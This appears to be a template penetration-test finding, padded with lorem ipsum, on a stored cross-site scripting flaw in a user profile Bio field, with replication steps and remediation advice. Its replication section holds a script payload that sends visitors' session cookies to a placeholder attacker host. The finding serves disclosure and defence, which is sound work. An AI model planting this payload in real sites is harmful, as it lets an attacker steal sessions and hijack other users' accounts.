---
title: "Lorem Ipsum Finding — Stored Cross-Site Scripting (XSS) in User Profile"
cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N"
status: "Open"
component: "User Profile"
cwe: "CWE-79"
owasp: "A03:2021"
mitre: "T1059"
mitigations: "M1021, M1050"
impact: "High"
sophistication: "Medium"
material_impact: "Reputational Damage"
business_risk:
  - Operational
  - Reputational
affected_urls:
  - "https://portal.loremipsum.example/profile/edit"
  - "https://portal.loremipsum.example/profile/:user_id"
timeline:
  - date: "1970-01-01T11:05:00+00:00"
    description: "Lorem ipsum dolor sit amet — identified stored XSS in the user profile Bio field; confirmed session cookie exfiltration"
    include: true
---

## Description

Lorem ipsum dolor sit amet, consectetur adipiscing elit. The user profile `Bio` field does not sanitize HTML markup before storing it in the database: sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.

## Impact

Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. A malicious authenticated user can inject JavaScript that executes for every visitor of their profile page, duis aute irure dolor in reprehenderit in voluptate.

## Replication

1. Lorem ipsum: log in to `https://portal.loremipsum.example`.
2. Dolor sit amet: navigate to **Settings → Edit Profile**.
3. Consectetur adipiscing: enter the following in the **Bio** field and save:

   ```html
   <script>document.location='https://lorem-ipsum-attacker.example/steal?c='+document.cookie</script>
   ```

4. Sed do eiusmod: log in as a different user and navigate to the attacker's profile.
5. Tempor incididunt: observe the session cookie is transmitted to the placeholder attacker-controlled server.

![Lorem ipsum placeholder screenshot for this finding](../assets/screenshots/xss-payload.png){width=90%}

![Lorem ipsum placeholder screenshot for cookie exfiltration](../assets/screenshots/xss-exfil.png){width=90%}

## Remediation

Lorem ipsum dolor sit amet: sanitize all user-supplied HTML before storage using an allowlist-based library such as [DOMPurify](https://github.com/cure53/DOMPurify) (client-side) or [bleach](https://github.com/mozilla/bleach) (server-side). Consectetur adipiscing elit:

- Set the `HttpOnly` flag on session cookies to limit JavaScript access.
- Implement a Content Security Policy (CSP) header: `Content-Security-Policy: default-src 'self'`.
- Encode output at the point of rendering using context-appropriate encoding.
